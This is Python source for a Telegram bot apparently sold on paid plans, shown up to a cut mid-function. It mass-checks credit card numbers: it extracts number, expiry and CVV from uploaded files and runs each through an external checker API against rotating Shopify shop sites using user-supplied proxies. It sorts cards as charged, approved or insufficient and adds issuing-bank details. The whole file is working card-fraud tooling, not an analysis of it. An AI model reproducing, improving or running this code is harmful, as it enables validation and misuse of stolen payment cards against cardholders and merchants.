# 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝙑𝙄𝙋 𝙎𝙮𝙨𝙩𝙚𝙢 - (𝟭𝟮𝟬𝗪 - 𝗦𝘁𝗿𝗶𝗰𝘁 𝗣𝗿𝗼𝘅𝘆 - 𝗙𝗲𝗲𝗱𝗯𝗮𝗰𝗸 - 𝗕𝗮𝗰𝗸 - 𝗧𝗶𝗺𝗲𝗿 - 𝟭𝟬𝟬% 𝗚𝗜𝗙𝘀 - 𝗙𝗼𝗿𝗰𝗲 𝗝𝗼𝗶𝗻 𝗨𝗹𝘁𝗶𝗺𝗮𝘁𝗲)
from telethon.errors import FloodWaitError, UserNotParticipantError
from telethon import TelegramClient, events, Button
from telethon.tl.types import ChannelParticipantBanned
from telethon.tl.functions.channels import GetParticipantRequest
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import logging
import io
from datetime import datetime, timedelta
from urllib.parse import urlparse

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

from database2 import (
    init_db, ensure_user, get_user_plan, set_user_plan,
    is_premium_user, is_banned_user, get_all_user_proxies,
    get_proxy_count, add_proxy_db, remove_proxy_by_index,
    clear_all_proxies, is_user_marked_joined, mark_user_joined,
    remove_joined_mark, get_total_users, get_premium_count
)

# ====================== CONFIG ======================
API_ID = int(os.getenv('API_ID', 0))
API_HASH = os.getenv('API_HASH', '').strip()
BOT_TOKEN = os.getenv('BOT_TOKEN', '').strip()

client = TelegramClient('razor_x_bot', API_ID, API_HASH)
client_instance = client

_admin_env = os.getenv("ADMIN_ID", "8879293808")
try: ADMIN_ID = [int(x.strip()) for x in _admin_env.split(",") if x.strip()]
except: ADMIN_ID = [8879293808]

# ⚠️ جلب إعدادات الإجبار من Railway بشكل آمن
_jcid = str(os.getenv("JOIN_CHANNEL_ID", "0")).strip()
try: JOIN_CHANNEL_ID = int(_jcid)
except: JOIN_CHANNEL_ID = 0

_jgid = str(os.getenv("JOIN_GROUP_ID", "0")).strip()
try: JOIN_GROUP_ID = int(_jgid)
except: JOIN_GROUP_ID = 0

JOIN_CHANNEL_LINK = os.getenv("JOIN_CHANNEL_LINK", "https://t.me/hgffrrddrddf")
JOIN_GROUP_LINK = os.getenv("JOIN_GROUP_LINK", "https://t.me/jonvhddrrd")

CHECKER_API_URL = 'https://autosh.up.railway.app/shopii'
PROXY_FILE = 'proxy.txt'
GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")

# --- SPEED CONFIG ---
WORKERS = 120 
API_TIMEOUT = 60  
DELAY = 0.05
HIT_DELAY = 0.5

_SITE_ERRORS_COUNT = {}
_MAX_SITE_ERRORS = 4
_JOIN_CACHE = {}

# ====================== VIP EMOJIS, FLAGS & GIFS ======================
WELCOME_GIF = "https://media.giphy.com/media/3o7aD2d7hy9ktXNDP2/giphy.gif"

VIP_EMOJIS = {
    "charged": "5039644681583985437", "approved": "5039793437776282663",
    "insufficient": "5042176294222037888", "card": "5042101437237036298",
    "bank": "5042334757040423886", "country_default": "5042186567783809934",
    "time": "5042306247047513767", "price": "5042050649248760772",
    "gateway": "5042186567783809934", "msg": "5039649904264217620"
}

CUSTOM_COUNTRY_EMOJIS = {
    "US": 0, "GB": 0, "CA": 0, "AU": 0, "DE": 0, "FR": 0, "IT": 0, "ES": 0, "BR": 0, "IN": 0,
    "SA": 0, "AE": 0, "KW": 0, "QA": 0, "BH": 0, "OM": 0, "EG": 0, "JO": 0, "MA": 0, "DZ": 0,
    "TR": 0, "RU": 0, "CN": 0, "JP": 0, "KR": 0, "MX": 0, "AR": 0, "CO": 0, "CL": 0, "PE": 0,
    "ZA": 0, "NG": 0, "KE": 0, "SE": 0, "NO": 0, "DK": 0, "FI": 0, "NL": 0, "BE": 0, "CH": 0,
    "AT": 0, "PT": 0, "GR": 0, "PL": 0, "CZ": 0, "HU": 0, "RO": 0, "BG": 0, "IE": 0, "NZ": 0,
    "SG": 0, "MY": 0, "TH": 0, "VN": 0, "ID": 0, "PH": 0, "PK": 0, "BD": 0, "LK": 0, "NP": 0,
    "IL": 0, "IR": 0, "IQ": 0, "SY": 0, "LB": 0, "YE": 0, "SD": 0, "LY": 0, "TN": 0, "MR": 0
}

ANIME_GIFS = [
    "https://media.giphy.com/media/1n4iuWZFnTeN6qvdpD/giphy.gif", "https://media.giphy.com/media/11KzOet1ElBDz2/giphy.gif",
    "https://media.giphy.com/media/4ilFRqgbzbx4c/giphy.gif", "https://media.giphy.com/media/xT1R9yebNpKAAJjH0s/giphy.gif",
    "https://media.giphy.com/media/108BDeJ2BvtZRu/giphy.gif", "https://media.giphy.com/media/F3uJq1J1x0u6k/giphy.gif",
    "https://media.giphy.com/media/7ZjnR6t2kU2lO/giphy.gif", "https://media.giphy.com/media/f3IVyFGEA1uVwZ7h2o/giphy.gif",
    "https://media.giphy.com/media/oYxqA3S2ZqO3u/giphy.gif", "https://media.giphy.com/media/xUPGcxpCV81ebhq7cI/giphy.gif",
    "https://media.giphy.com/media/l41lUjUgLLwWPe20E/giphy.gif", "https://media.giphy.com/media/l0HlNQ03J5JxX6lva/giphy.gif",
    "https://media.giphy.com/media/3oEjI6SIIHBdRxXI40/giphy.gif", "https://media.giphy.com/media/26ufdipQqU2lhNA4g/giphy.gif",
    "https://media.giphy.com/media/l3vR16pONsV8cKCEE/giphy.gif", "https://media.giphy.com/media/xT0xezQGU5xCDJuCPe/giphy.gif",
    "https://media.giphy.com/media/3oKIPnAiaCRi8NNRWU/giphy.gif", "https://media.giphy.com/media/xT9IgzoWaVYHbYqNUk/giphy.gif",
    "https://media.giphy.com/media/26BkLGA2PqBf02Mpy/giphy.gif", "https://media.giphy.com/media/3o7TKsQ8gE0bF40Y6I/giphy.gif",
    "https://media.giphy.com/media/xT0xem7ZlZ2DOYqpG0/giphy.gif", "https://media.giphy.com/media/l46CtynlAiRNzfsIG/giphy.gif",
    "https://media.giphy.com/media/3o7WIxrKxS22wI3B0A/giphy.gif", "https://media.giphy.com/media/l0HlRnAWXxn0MhKLK/giphy.gif",
    "https://media.giphy.com/media/xT9DPIlGnuHpr2yOic/giphy.gif"
]

PLANS = {
    "plan1": {"name": "𝘊𝘰𝘳𝘦 𝘈𝘤𝘤𝘦𝘴𝘴", "tier": "Core", "duration_days": 7, "emoji": "🛠️", "price": "$8.00"},
    "plan2": {"name": "𝘌𝘭𝘪𝘵𝘦 𝘈𝘤𝘤𝘦𝘴𝘴", "tier": "Elite", "duration_days": 15, "emoji": "👑", "price": "$14.00"},
    "plan3": {"name": "𝘙𝘰𝘰𝘵 𝘈𝘤𝘤𝘦𝘴𝘴", "tier": "Root", "duration_days": 30, "emoji": "⭐", "price": "$25.00"},
    "plan4": {"name": "𝘟-𝘈𝘤𝘤𝘦𝘴𝘴", "tier": "X", "duration_days": 90, "emoji": "💎", "price": "$60.00"},
}
PAID_TIERS = ["Core", "Elite", "Root", "X"]

USER_LAST_REQ = {}
ACTIVE_MTXT_PROCESSES = {}
PENDING_FILES = {}
HIT_BUTTON = [[Button.url("⇾ 𝘖𝘸𝘯𝘦𝘳 ⇽", "https://t.me/Dddadddyttt")]]

_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty', 'tax amount is empty', 
    'payment method identifier is empty', 'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out', 'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found', 'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error', 'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable', 'gateway timeout', 'network error', 
    'connection reset', 'failed to detect product', 'failed to create checkout', 'failed to tokenize card', 
    'failed to get proposal data', 'submit rejected', 'handle error', 'http 404', 'url rejected',
    'malformed input', 'amount_too_small', 'amount too small', 'site dead', 'captcha_required', 
    'site errors', 'failed', 'all products sold out', 'no_session_token', 'tokenize_fail',
    'proxy dead', 'proxy error', 'proxy connection', 'bad proxy', 'connection timeout failed', 
    'session_error', 'session expired'
)

# ====================== RELIABLE GIF FETCHER ======================
async def fetch_random_gif(specific_url=None):
    url = specific_url if specific_url else random.choice(ANIME_GIFS)
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=10) as response:
                if response.status == 200:
                    file_data = await response.read()
                    gif_io = io.BytesIO(file_data)
                    gif_io.name = 'animation.gif'
                    return gif_io
    except Exception as e:
        logging.error(f"Failed to fetch GIF: {e}")
    return None

# ====================== HELPER FUNCTIONS ======================
def is_dead_site_error(error_msg):
    if not error_msg: return True
    return any(keyword in str(error_msg).lower() for keyword in _DEAD_INDICATORS)

async def check_single_chat(user_id, chat):
    if not chat or chat == 0: return True
    try:
        # جلب الكيان أولاً لتجنب ValueError، ثم فحص الاشتراك
        try: entity = await client_instance.get_entity(chat)
        except ValueError: entity = chat
        
        part = await client_instance(GetParticipantRequest(channel=entity, participant=user_id))
        if isinstance(part.participant, ChannelParticipantBanned): return False
        return True
    except UserNotParticipantError:
        return False
    except Exception as e:
        print(f"⚠️ [JOIN ERROR] Cannot check user {user_id} in {chat}: {e}")
        return False

async def is_user_joined(user_id):
    if JOIN_CHANNEL_ID == 0 and JOIN_GROUP_ID == 0: return True
    
    c_ok = await check_single_chat(user_id, JOIN_CHANNEL_ID)
    g_ok = await check_single_chat(user_id, JOIN_GROUP_ID)
    
    return c_ok and g_ok

async def force_join_check(event):
    uid = event.sender_id
    if uid in ADMIN_ID: return True  # استثناء الأدمن 100%
    
    now = time.time()
    if uid in _JOIN_CACHE and now - _JOIN_CACHE[uid] < 600: return True
    
    if await is_user_joined(uid):
        _JOIN_CACHE[uid] = now
        return True
    
    kb = []
    if JOIN_CHANNEL_LINK and JOIN_CHANNEL_ID != 0: kb.append(Button.url("📢 𝘑𝘰𝘪𝘯 𝘊𝘩𝘢𝘯𝘯𝘦𝘭", JOIN_CHANNEL_LINK))
    if JOIN_GROUP_LINK and JOIN_GROUP_ID != 0: kb.append(Button.url("💬 𝘑𝘰𝘪𝘯 𝘎𝘳𝘰𝘶𝘱", JOIN_GROUP_LINK))
    
    if not kb: return True # إذا لم يضع الأدمن روابط، يمرر المستخدم
    
    kb = [kb, [Button.inline("✅ 𝘝𝘦𝘳𝘪𝘧𝘺", b"check_joined")]]
    await event.reply("⦗ 🛑 ⦘ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘋𝘦𝘯𝘪𝘦𝘥\n\n├ 𝘠𝘰𝘶 𝘮𝘶𝘴𝘵 𝘫𝘰𝘪𝘯 𝘰𝘶𝘳 𝘰𝘧𝘧𝘪𝘤𝘪𝘢𝘭 𝘤𝘩𝘢𝘯𝘯𝘦𝘭𝘴 𝘧𝘪𝘳𝘴𝘵.\n╰ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘫𝘰𝘪𝘯, 𝘵𝘩𝘦𝘯 𝘤𝘭𝘪𝘤𝘬 '𝘝𝘦𝘳𝘪𝘧𝘺'.", buttons=kb, parse_mode="html")
    return False

def is_paid_plan(plan):
    return plan and plan.lower() in [p.lower() for p in PAID_TIERS]

def get_cc_limit(plan, uid=0):
    if uid in ADMIN_ID: return 50000
    plan_lower = str(plan).lower() if plan else "bronze"
    if "x" in plan_lower: return 10000
    if "root" in plan_lower: return 2000
    if "elite" in plan_lower: return 500
    if "core" in plan_lower: return 100
    return 15

async def send_premium_only_message(event):
    return await event.reply("⚠️ 𝘗𝘳𝘦𝘮𝘪𝘶𝘮 𝘈𝘤𝘤𝘦𝘴𝘴 𝘙𝘦𝘲𝘶𝘪𝘳𝘦𝘥.", parse_mode="html")

async def styled_reply(event, text, buttons=None, file=None):
    return await event.reply(text, buttons=buttons, file=file, parse_mode="html")

async def styled_send(chat, text, buttons=None, file=None):
    return await client_instance.send_message(chat, text, buttons=buttons, file=file, parse_mode="html")

async def styled_edit(msg, text, buttons=None):
    return await msg.edit(text, buttons=buttons, parse_mode="html")

async def get_bin_info(bin_code):
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_code[:6]}") as r:
                if r.status == 200:
                    data = await r.json()
                    return {
                        "brand": data.get("brand", "-"),
                        "type": data.get("type", "-"),
                        "level": data.get("level", "-"),
                        "bank": data.get("bank", "-"),
                        "country": data.get("country_name", "-"),
                        "country_code": data.get("country", "-"),
                        "flag": data.get("country_flag", "🏳️")
                    }
    except: pass
    return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "-", "flag": "🏳️"}

# ====================== LUXURY HIT FORMATTER ======================
def get_custom_emoji(key, fallback=""):
    eid = VIP_EMOJIS.get(key, "")
    return f'<tg-emoji emoji-id="{eid}">{fallback}</tg-emoji>' if eid else fallback

def get_country_emoji(c_code, default_flag):
    eid = CUSTOM_COUNTRY_EMOJIS.get(c_code, 0)
    if eid != 0:
        return f'<tg-emoji emoji-id="{eid}">{default_flag}</tg-emoji>'
    return get_custom_emoji("country_default", default_flag)

def format_card_result(status, card, gateway, response, price="-", bin_info=None, elapsed=0.0):
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "-", "flag": "🏳️"}
    ps = f"${str(price).replace('$', '')}" if price and price != "-" else "-"
    
    if status == "Charged":
        header = f"⦗ {get_custom_emoji('charged', '🟢')} ⦘ 𝘊𝘩𝘢𝘳𝘨𝘦𝘥 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺"
    elif status == "Approved":
        header = f"⦗ {get_custom_emoji('approved', '⚡')} ⦘ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘝𝘝"
    elif status == "Insufficient":
        header = f"⦗ {get_custom_emoji('insufficient', '🟡')} ⦘ 𝘐𝘯𝘴𝘶𝘧𝘧𝘪𝘤𝘪𝘦𝘯𝘵 𝘍𝘶𝘯𝘥𝘴"
    elif status == "Dead":
        header = f"⦗ 🔴 ⦘ 𝘋𝘦𝘤𝘭𝘪𝘯𝘦𝘥"
    else:
        header = f"⦗ ⚠️ ⦘ 𝘌𝘳𝘳𝘰𝘳 / 𝘙𝘦𝘵𝘳𝘺"

    c_code = bi.get('country_code', '')
    country_display = f"{bi.get('country', '-')} {get_country_emoji(c_code, bi.get('flag', '🏳️'))}"

    return f"""{header}

⦗ {get_custom_emoji('card', '💳')} ⦘ 𝘊𝘢𝘳𝘥 ⇾ <code>{card}</code>

⦗ {get_custom_emoji('msg', '💬')} ⦘ 𝘙𝘦𝘴𝘱𝘰𝘯𝘴𝘦 ⇾ <code>{response}</code>

⦗ {get_custom_emoji('gateway', '🌐')} ⦘ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 ⇾ <code>{gateway}</code>
⦗ {get_custom_emoji('price', '💲')} ⦘ 𝘗𝘳𝘪𝘤𝘦 ⇾ <code>{ps}</code>

⦗ {get_custom_emoji('bank', '🏦')} ⦘ 𝘉𝘢𝘯𝘬 𝘐𝘯𝘧𝘰
 ├ 𝘉𝘢𝘯𝘬: <code>{bi.get('bank', '-')}</code>
 ├ 𝘊𝘰𝘶𝘯𝘵𝘳𝘺: <code>{country_display}</code>
 ├ 𝘉𝘳𝘢𝘯𝘥: <code>{bi.get('brand', '-')}</code>
 ╰ 𝘛𝘺𝘱𝘦: <code>{bi.get('type', '-')} - {bi.get('level', '-')}</code>

⦗ {get_custom_emoji('time', '⏱')} ⦘ 𝘛𝘰𝘰𝘬 ⇾ <code>{elapsed:.2f}s</code>"""

# ====================== SESSIONS ======================
_USER_HTTP_SESSIONS = {}
_USER_SEMS = {}

def get_user_sem(uid, sem_type="msp"):
    key = f"{uid}_{sem_type}"
    if key not in _USER_SEMS:
        _USER_SEMS[key] = asyncio.Semaphore(WORKERS)
    return _USER_SEMS[key]

async def get_user_http_session(uid, purpose="general"):
    key = f"{uid}_{purpose}"
    session = _USER_HTTP_SESSIONS.get(key)
    if session is None or session.closed:
        connector = aiohttp.TCPConnector(limit=250, ssl=False, enable_cleanup_closed=True)
        timeout = aiohttp.ClientTimeout(total=45, connect=15, sock_read=20)
        session = aiohttp.ClientSession(timeout=timeout, connector=connector)
        _USER_HTTP_SESSIONS[key] = session
    return session

async def cleanup_user_http_session(uid, purpose="general"):
    key = f"{uid}_{purpose}"
    session = _USER_HTTP_SESSIONS.pop(key, None)
    if session and not session.closed:
        try: await session.close()
        except: pass

def cleanup_user_sem(uid):
    for k in list(_USER_SEMS.keys()):
        if k.startswith(f"{uid}_"): del _USER_SEMS[k]

# ====================== EXTRACTION ======================
def extract_cc(text):
    if not text: return []
    cards = []
    for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        if len(y) == 2: y = '20' + y
        cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text): cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text): cards.append(f"{c}|{m}|20{y}|{cv}")
    return list(dict.fromkeys(cards))

def parse_proxy_format(proxy):
    proxy = proxy.strip()
    pt = 'http'
    pm = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if pm: pt, proxy = pm.group(1).lower(), pm.group(2)
    h = p = u = pw = ''
    if re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy):
        m_parts = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
        u, pw, h, p = m_parts.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        m2 = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        ph, pp, pu, ppw = m2.groups()
        if 0 < int(pp) <= 65535: h, p, u, pw = ph, pp, pu, ppw
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        m3 = re.match(r'^([^:@]+):(\d+)$', proxy)
        h, p = m3.groups()
    else: return None
    if not h or not p: return None
    pu = f'{pt}://{u}:{pw}@{h}:{p}' if u and pw else f'{pt}://{h}:{p}'
    return {'ip': h, 'port': p, 'username': u or None, 'password': pw or None, 'proxy_url': pu, 'type': pt}

def format_proxy_for_api(proxy):
    if not proxy: return ""
    if isinstance(proxy, dict):
        if proxy.get('username') and proxy.get('password'):
            return f"{proxy['username']}:{proxy['password']}@{proxy['ip']}:{proxy['port']}"
        return f"{proxy['ip']}:{proxy['port']}"
    if isinstance(proxy, str):
        clean = proxy.strip()
        if "://" in clean:
            try: return urlparse(clean).netloc
            except: return clean
        return clean
    return ""

_CACHED_SITES = []
_LAST_SITES_FETCH = 0
async def get_github_sites():
    global _CACHED_SITES, _LAST_SITES_FETCH
    now = time.time()
    if _CACHED_SITES and (now - _LAST_SITES_FETCH < 600): return _CACHED_SITES
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(GITHUB_SITES_URL, timeout=10) as r:
                if r.status == 200:
                    text = await r.text()
                    sites = [re.sub(r'^https?://', '', line.strip()).rstrip('/') for line in text.split('\n') if line.strip()]
                    if sites:
                        _CACHED_SITES = list(set(sites))
                        _LAST_SITES_FETCH = now
    except: pass
    if not _CACHED_SITES and os.path.exists('sites.txt'):
        try:
            with open('sites.txt', 'r', encoding='utf-8') as f:
                _CACHED_SITES = list(set([re.sub(r'^https?://', '', line.strip()).rstrip('/') for line in f if line.strip()]))
        except: pass
    return _CACHED_SITES

def get_txt_proxies(): return []

# ====================== API CHECKER ======================
async def check_card_api(card, site, proxy, session, gateway_name):
    try:
        parts = card.split('|')
        if len(parts) != 4: return {'status': 'Dead', 'message': 'Invalid card format', 'card': card}

        params = {'cc': card, 'site': site}
        fproxy = format_proxy_for_api(proxy)
        if fproxy: params['proxy'] = fproxy
        
        strict_timeout = aiohttp.ClientTimeout(total=20)
        async with session.get(CHECKER_API_URL, params=params, timeout=strict_timeout) as resp:
            text_data = await resp.text()
            if resp.status != 200: return {'status': 'Site Error', 'message': f'Server Error {resp.status}', 'card': card, 'retry': True}
            try: rj = json.loads(text_data)
            except: return {'status': 'Site Error', 'message': 'Format Error from Server API', 'card': card, 'retry': True}

        response_msg = rj.get('Response', '')
        price = rj.get('Price', '-')
        
        gate = gateway_name if gateway_name else rj.get('Gate', 'Shopify')
        status = rj.get('Status', '')

        if is_dead_site_error(response_msg):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}

        response_lower = str(response_msg).lower()

        if status == 'Charged' or 'order completed' in response_lower or '💎' in response_msg or 'thank you' in response_lower or 'payment successful' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif 'cloudflare bypass failed' in response_lower:
            return {'status': 'Site Error', 'message': 'Cloudflare active', 'card': card, 'retry': True, 'gateway': gate, 'price': price}
        elif 'insufficient_funds' in response_lower or 'insufficient funds' in response_lower:
            return {'status': 'Insufficient', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif status == 'Approved' or any(key in response_lower for key in ['approved', 'success', 'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc', 'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc', 'incorrect_zip', 'incorrect zip']):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        else:
            if any(k in response_lower for k in ['proxy', 'timeout', 'error', 'session', 'failed']):
                return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}

    except asyncio.TimeoutError: return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True}
    except Exception: return {'status': 'Site Error', 'message': 'Connection dropped', 'card': card, 'retry': True}

async def check_card_with_retry(card, sites, proxies, session, gateway_name, max_retries=3):
    last_result = None
    available_proxies = list(proxies) if proxies else []

    for attempt in range(max_retries):
        active_sites = [s for s in sites if _SITE_ERRORS_COUNT.get(s, 0) < _MAX_SITE_ERRORS]
        
        if not active_sites:
            return {'status': 'Site Error', 'message': 'All available gateways are currently broken or blocked.', 'card': card, 'gateway': gateway_name, 'price': '-'}

        site = random.choice(active_sites)
        
        if not available_proxies: available_proxies = list(proxies) if proxies else []
        proxy = random.choice(available_proxies) if available_proxies else None
        
        result = await check_card_api(card, site, proxy, session, gateway_name)
        
        if not result.get('retry'): 
            if result.get('status') in ['Charged', 'Approved', 'Insufficient', 'Dead']:
                _SITE_ERRORS_COUNT[site] = 0
            return result

        last_result = result
        msg_lower = str(result.get('message', '')).lower()
        
        if proxy and ('proxy' in msg_lower or 'timeout' in msg_lower) and proxy in available_proxies:
            available_proxies.remove(proxy)
            
        gateway_broken_indicators = ['cloudflare', '502', '503', '504', 'bad gateway', 'service unavailable', 'site dead', 'invalid url', '404', 'not found', 'access denied']
        if any(err in msg_lower for err in gateway_broken_indicators):
            _SITE_ERRORS_COUNT[site] = _SITE_ERRORS_COUNT.get(site, 0) + 1

        if attempt < max_retries - 1: await asyncio.sleep(DELAY) 

    if last_result: return {'status': 'Dead', 'message': f'{str(last_result["message"])[:40]}', 'card': card, 'gateway': gateway_name, 'price': last_result.get('price', '-')}
    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': gateway_name, 'price': '-'}

# ====================== AUTO MASS CHECK (GATEWAY SELECTION) ======================
@client.on(events.NewMessage(func=lambda e: getattr(e, 'document', None) and e.document.mime_type.startswith('text/')))
async def auto_file_check_cmd(event):
    try:
        uid = event.sender_id
        now = time.time()
        if uid in USER_LAST_REQ and now - USER_LAST_REQ[uid] < 5:
            return await event.reply("⚠️ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘸𝘢𝘪𝘵 𝘣𝘦𝘧𝘰𝘳𝘦 𝘴𝘦𝘯𝘥𝘪𝘯𝘨 𝘢𝘯𝘰𝘵𝘩𝘦𝘳 𝘧𝘪𝘭𝘦.", parse_mode="html")
        USER_LAST_REQ[uid] = now

        if getattr(event.document, 'size', 0) > 2 * 1024 * 1024:
            return await event.reply("⚠️ 𝘍𝘪𝘭𝘦 𝘵𝘰𝘰 𝘭𝘢𝘳𝘨𝘦! (𝘔𝘢𝘹 𝟤𝘔𝘉)", parse_mode="html")

        if not await force_join_check(event): return
        
        plan = await get_user_plan(uid)
        
        db_proxies = await get_all_user_proxies(uid)
        proxies = [p['proxy_url'] for p in db_proxies]
        if not proxies:
            return await styled_reply(event, "<b>⚠️ 𝘠𝘰𝘶 𝘮𝘶𝘴𝘵 𝘢𝘥𝘥 𝘱𝘳𝘰𝘹𝘪𝘦𝘴 𝘣𝘦𝘧𝘰𝘳𝘦 𝘤𝘩𝘦𝘤𝘬𝘪𝘯𝘨! 𝘜𝘴𝘦 <code>/addpxy</code> 𝘵𝘰 𝘢𝘥𝘥.</b>")
        
        if uid in ACTIVE_MTXT_PROCESSES: return await styled_reply(event, "⚠️ 𝘈 𝘱𝘳𝘰𝘤𝘦𝘴𝘴 𝘪𝘴 𝘢𝘭𝘳𝘦𝘢𝘥𝘺 𝘢𝘤𝘵𝘪𝘷𝘦!")
        
        fp = await event.download_media()
        content = ""
        try:
            async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f: content = await f.read()
        finally:
            if os.path.exists(fp): os.remove(fp)

        cards = extract_cc(content)
        if not cards: return await styled_reply(event, "⚠️ 𝘕𝘰 𝘷𝘢𝘭𝘪𝘥 𝘤𝘢𝘳𝘥𝘴 𝘧𝘰𝘶𝘯𝘥 𝘪𝘯 𝘧𝘪𝘭𝘦.")
        
        cl = get_cc_limit(plan, uid)
        if len(cards) > cl: cards = cards[:cl]
        
        PENDING_FILES[uid] = cards
        
        kb = [
            [Button.inline("🛍️ 𝘚𝘩𝘰𝘱𝘪𝘧𝘺 𝘎𝘢𝘵𝘦𝘸𝘢𝘺", b"gate:Shopify"), Button.inline("💳 𝘚𝘵𝘳𝘪𝘱𝘦 (𝘚𝘰𝘰𝘯)", b"gate:soon_Stripe")],
            [Button.inline("🅿️ 𝘗𝘢𝘺𝘗𝘢𝘭 (𝘚𝘰𝘰𝘯)", b"gate:soon_PayPal"), Button.inline("🌐 𝘉𝘳𝘢𝘪𝘯𝘵𝘳𝘦𝘦 (𝘚𝘰𝘰𝘯)", b"gate:soon_Braintree")],
            [Button.inline("❌ 𝘊𝘢𝘯𝘤𝘦𝘭", b"gate:cancel")]
        ]
        
        await styled_reply(event, f"⦗ ⚙️ ⦘ 𝘍𝘪𝘭𝘦 𝘓𝘰𝘢𝘥𝘦𝘥 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺\n\n├ 𝘛𝘰𝘵𝘢𝘭 𝘊𝘊𝘴: <code>{len(cards)}</code>\n╰ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘴𝘦𝘭𝘦𝘤𝘵 𝘢 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 𝘵𝘰 𝘴𝘵𝘢𝘳𝘵:", buttons=kb)
        
    except Exception as e: await event.reply(f"⚠️ Error: {e}")

@client.on(events.CallbackQuery(pattern=rb"gate:(.*)"))
async def gateway_selection_cb(event):
    uid = event.sender_id
    gate_name = event.pattern_match.group(1).decode()
    
    if gate_name.startswith("soon_"):
        real_name = gate_name.split("_")[1]
        return await event.answer(f"⏳ {real_name} Gateway is coming soon! Please choose another.", alert=True)
    
    if gate_name == "cancel":
        PENDING_FILES.pop(uid, None)
        return await styled_edit(event, "⦗ ❌ ⦘ 𝘗𝘳𝘰𝘤𝘦𝘴𝘴 𝘊𝘢𝘯𝘤𝘦𝘭𝘭𝘦𝘥.")
        
    cards = PENDING_FILES.pop(uid, None)
    if not cards:
        return await event.answer("⚠️ Session expired or invalid file.", alert=True)
        
    ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
    
    msg = await styled_edit(event, f"⦗ ⚡ ⦘ 𝘗𝘳𝘦𝘱𝘢𝘳𝘪𝘯𝘨 𝘚𝘦𝘴𝘴𝘪𝘰𝘯...\n\n├ 𝘓𝘰𝘢𝘥𝘦𝘥: <code>{len(cards)} 𝘊𝘊𝘴</code>\n├ 𝘛𝘩𝘳𝘦𝘢𝘥𝘴: <code>{WORKERS}</code>\n╰ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺: <code>{gate_name}</code>")
    
    asyncio.create_task(_run_mass_process(event, msg, cards, ACTIVE_MTXT_PROCESSES, "stop_chk", gate_name, "msp"))

async def _run_mass_process(event, msg_obj, cards, process_store, stop_prefix, gate_name, sem_type):
    uid = event.sender_id
    total = len(cards); checked = charged = approved = insufficient = declined = errors = 0
    st = time.time()
    
    sites = await get_github_sites()
    db_proxies = await get_all_user_proxies(uid)
    proxies = [p['proxy_url'] for p in db_proxies]

    user_sem = get_user_sem(uid, sem_type)
    http_session = await get_user_http_session(uid, sem_type)
    
    lcd = "-"
    
    def is_stopped():
        proc = process_store.get(uid)
        return proc.get("stopped", False) if isinstance(proc, dict) else True

    async def dashboard_updater():
        while not is_stopped():
            await asyncio.sleep(3.5)
            if is_stopped(): break
            kb = [
                [Button.inline(f"⦗ 💳 ⦘ {lcd}", b"none")],
